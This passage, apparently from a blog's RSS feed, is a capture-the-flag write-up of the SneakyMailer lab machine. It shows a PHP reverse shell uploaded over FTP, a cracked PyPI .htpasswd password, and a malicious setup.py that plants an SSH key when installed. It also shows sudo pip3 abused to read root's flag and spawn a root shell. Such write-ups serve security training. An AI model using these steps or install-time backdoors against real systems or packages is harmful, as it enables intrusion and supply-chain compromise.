<p><img src="imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png" alt="f11b8bd4b2934eb892f681d23a369cdd" style="zoom:67%;" /></p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p>
<p><img src="imgs/f761f7b9b264477ebae8d690c347cbef.png" alt="f761f7b9b264477ebae8d690c347cbef" style="zoom:67%;" /></p>
<p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p>
<p><img src="imgs/cea046ccdffc4e0f83620407c53726d5.png" alt="cea046ccdffc4e0f83620407c53726d5" style="zoom: 67%;" /></p>
<h4 id="reverse-shell-via-ftp-upload">Reverse Shell via FTP Upload</h4>
<p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">211-FTP server status:
     Connected to ::ffff:10.10.14.20
     Logged in as developer
     TYPE: ASCII
     No session bandwidth limit
     Session timeout in seconds is <span style="color:#ae81ff">300</span>
     Control connection is plain text
     Data connections will be plain text
     At session startup, client count was <span style="color:#ae81ff">1</span>
     vsFTPd 3.0.3 - secure, fast, stable
ftp&gt; cd /dev
<span style="color:#ae81ff">250</span> Directory successfully changed.
ftp&gt; put /shares/reversef.php iamf.php
local: /shares/reversef.php remote: iamf.php
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Ok to send data.
<span style="color:#ae81ff">226</span> Transfer complete.
<span style="color:#ae81ff">72</span> bytes sent in 0.00 secs <span style="color:#f92672">(</span>2.8610 MB/s<span style="color:#f92672">)</span>
</code></pre></div><p>At first I thought it was on <code>http://sneakycorp.htb/iamf.php</code>, the uploaded shell was available on <code>http://dev.sneakycorp.htb/iamf.php</code>, so I&rsquo;ll have to add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
</code></pre></div><p>Now I can trigger my web shell with curl.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ curl -s http://dev.sneakycorp.htb/iamf.php
</code></pre></div><p>The listener has an interactive shell now.</p>
<p><img src="imgs/43276abaf55b4760822901631d8c21de.png" alt="43276abaf55b4760822901631d8c21de" style="zoom:67%;" /></p>
<p>After gaining access to the box, I can re-enumerate and search for files containing sensitive data.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-low">Shell as low</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p>
<p><img src="imgs/image-20210429003013735.png" alt="image-20210429003013735" style="zoom: 67%;" /></p>
<p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p>
<p><img src="imgs/image-20210429003321320.png" alt="image-20210429003321320" style="zoom:67%;" /></p>
<p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p>
<h4 id="cracking-password">Cracking Password</h4>
<p>The password can be cracked easily with John the Ripper.</p>
<p><img src="imgs/image-20210429003613068.png" alt="image-20210429003613068" style="zoom:67%;" /></p>
<p>The password is <code>soufianeelhaoui</code></p>
<h4 id="malicious-pypi-package">Malicious PyPI package</h4>
<p>Looking into the web configuration file, <code>pypi.sneakycorp.htb</code> is accessible on <code>localhost:5000</code>.</p>
<p><img src="imgs/image-20210429005849918.png" alt="image-20210429005849918" style="zoom: 67%;" /></p>
<p>It is also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p>
<p><img src="imgs/image-20210429005829551.png" alt="image-20210429005829551" style="zoom:67%;" /></p>
<p>Remember about the second email Paul sent to user law?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
</code></pre></div><p>Now the idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p>
<p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p>
<ul>
<li><a href="https://packaging.python.org/tutorials/packaging-projects/">https://packaging.python.org/tutorials/packaging-projects/</a></li>
<li>And you might want to read this too, <a href="https://packaging.python.org/specifications/pypirc/">https://packaging.python.org/specifications/pypirc/</a></li>
</ul>
<p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> setuptools

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;README.md&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> fh:
    long_description <span style="color:#f92672">=</span> fh<span style="color:#f92672">.</span>read()

setuptools<span style="color:#f92672">.</span>setup(
    name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span>, <span style="color:#75715e"># Replace with your own username</span>
    version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.1&#34;</span>,
    author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Example Author&#34;</span>,
    author_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author@example.com&#34;</span>,
    description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A small example package&#34;</span>,
    long_description<span style="color:#f92672">=</span>long_description,
    long_description_content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/markdown&#34;</span>,
    url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject&#34;</span>,
    project_urls<span style="color:#f92672">=</span>{
        <span style="color:#e6db74">&#34;Bug Tracker&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject/issues&#34;</span>,
    },
    classifiers<span style="color:#f92672">=</span>[
        <span style="color:#e6db74">&#34;Programming Language :: Python :: 3&#34;</span>,
        <span style="color:#e6db74">&#34;License :: OSI Approved :: MIT License&#34;</span>,
        <span style="color:#e6db74">&#34;Operating System :: OS Independent&#34;</span>,
    ],
    package_dir<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;&#34;</span>: <span style="color:#e6db74">&#34;src&#34;</span>},
    packages<span style="color:#f92672">=</span>setuptools<span style="color:#f92672">.</span>find_packages(where<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;src&#34;</span>),
    python_requires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&gt;=3.6&#34;</span>,
)
</code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> setuptools
<span style="color:#66d9ef">try</span>:
        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/home/low/.ssh/authorized_keys&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
                f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span>)
        f<span style="color:#f92672">.</span>close()
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
        <span style="color:#66d9ef">pass</span>
setuptools<span style="color:#f92672">.</span>setup(
        name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;low&#34;</span>,
        version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.1&#34;</span>,
        author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Example Author&#34;</span>,
        author_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author@example.com&#34;</span>,
        description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A small example package&#34;</span>,
        long_description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>,
        long_description_content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/markdown&#34;</span>,
     url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject&#34;</span>,
     packages<span style="color:#f92672">=</span>setuptools<span style="color:#f92672">.</span>find_packages(),
     classifiers<span style="color:#f92672">=</span>[
        <span style="color:#e6db74">&#34;Programming Language :: Python :: 3&#34;</span>,
        <span style="color:#e6db74">&#34;License :: OSI Approved :: MIT License&#34;</span>,
        <span style="color:#e6db74">&#34;Operating System :: OS Independent&#34;</span>,
     ],
)
</code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p>
<p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">distutils</span>]
<span style="color:#a6e22e">index</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">servers</span> =
 <span style="color:#a6e22e">local</span>
 
[<span style="color:#a6e22e">local</span>]
<span style="color:#a6e22e">repository</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">://</span><span style="color:#ae81ff">127.0</span>.<span style="color:#ae81ff">0.1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span>
<span style="color:#a6e22e">username</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">pypi</span>
<span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">soufianeelhaoui</span>
</code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">distutils</span>]
<span style="color:#a6e22e">index</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">servers</span> =
 <span style="color:#a6e22e">remote</span>
 
[<span style="color:#a6e22e">remote</span>]
<span style="color:#a6e22e">repository</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">://</span><span style="color:#a6e22e">pypi</span>.<span style="color:#a6e22e">sneakycorp</span>.<span style="color:#a6e22e">htb</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>
<span style="color:#a6e22e">username</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">pypi</span>
<span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">soufianeelhaoui</span>
</code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.42» 
$ python3 -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
10.10.10.197 - - <span style="color:#f92672">[</span>12/Jul/2020  08:24:12<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /.pypirc HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
10.10.10.197 - - <span style="color:#f92672">[</span>12/Jul/2020  08:24:29<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /setup.py HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</code></pre></div><p>On SneakyMailer:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
www-data@sneakymailer:/dev/shm$ 
www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
</code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">.
├── .pypirc
├── iamf.php
└── setup.py
</code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ export $HOME<span style="color:#f92672">=</span>/dev/shm
www-data@sneakymailer:~$
</code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:~$ python3 setup.py sdist upload -r local
running sdist
running egg_info
writing low.egg-info/PKG-INFO
writing dependency_links to low.egg-info/dependency_links.txt
writing top-level names to low.egg-info/top_level.txt
reading manifest file <span style="color:#e6db74">&#39;low.egg-info/SOURCES.txt&#39;</span>
writing manifest file <span style="color:#e6db74">&#39;low.egg-info/SOURCES.txt&#39;</span>
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
running check
creating low-0.0.1
creating low-0.0.1/low.egg-info
copying files to low-0.0.1…
copying setup.py -&gt; low-0.0.1
copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
Writing low-0.0.1/setup.cfg
Creating tar archive
removing <span style="color:#e6db74">&#39;low-0.0.1&#39;</span> <span style="color:#f92672">(</span>and everything under it<span style="color:#f92672">)</span>
running upload
Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response <span style="color:#f92672">(</span>200<span style="color:#f92672">)</span>: OK
WARNING: Uploading via this command is deprecated, use twine to upload instead <span style="color:#f92672">(</span>https://pypi.org/p/twine/<span style="color:#f92672">)</span>
</code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Now I can login with my private key as user <code>low</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ ssh -i id_ecdsa low@10.10.10.197
</code></pre></div><p><img src="imgs/image-20210429021145269.png" alt="image-20210429021145269" style="zoom:67%;" /></p>
<p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-pip">Abusing sudo pip</h4>
<p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p>
<p><img src="imgs/image-20210429021533891.png" alt="image-20210429021533891" style="zoom: 67%;" /></p>
<p>I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/pip/">GTFOBins</a> to abuse this circumstance to obtain the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">low@sneakymailer:~$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
low@sneakymailer:~$
low@sneakymailer:~$ echo <span style="color:#e6db74">&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; $TF/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install $TF
</code></pre></div><p><img src="imgs/image-20210429021914961.png" alt="image-20210429021914961" style="zoom:67%;" /></p>
<p>Or to get a shell as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$
low@sneakymailer:~$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install $TF
sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.9ShSegy5bm
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
